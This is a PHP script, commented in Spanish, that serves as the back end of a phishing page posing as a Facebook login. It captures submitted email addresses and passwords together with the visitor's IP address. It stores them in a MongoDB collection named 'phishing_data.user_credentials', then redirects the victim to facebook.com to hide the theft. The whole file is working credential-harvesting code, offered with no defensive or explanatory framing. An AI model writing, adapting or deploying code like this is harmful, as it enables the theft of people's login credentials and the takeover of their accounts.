<?php

// Cargar la librería de MongoDB
require 'vendor/autoload.php';

// URI de conexión a MongoDB Atlas
$uri = "YOUR_BASE_MONGODB";

// Conectar a MongoDB
$client = new MongoDB\Client($uri);
$collection = $client->phishing_data->user_credentials;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Capturar la IP
    $ip = $_SERVER['REMOTE_ADDR'];

    // Crear un documento para MongoDB
    $document = [
        'email' => $email,
        'password' => $password,
        'ip' => $ip,
        'date' => new MongoDB\BSON\UTCDateTime()
    ];

    // Insertar el documento en MongoDB
    $collection->insertOne($document);

    // Redirigir al usuario a la página de Facebook
    header("Location: https://www.facebook.com");
    exit(); // Detener la ejecución del script
}

?>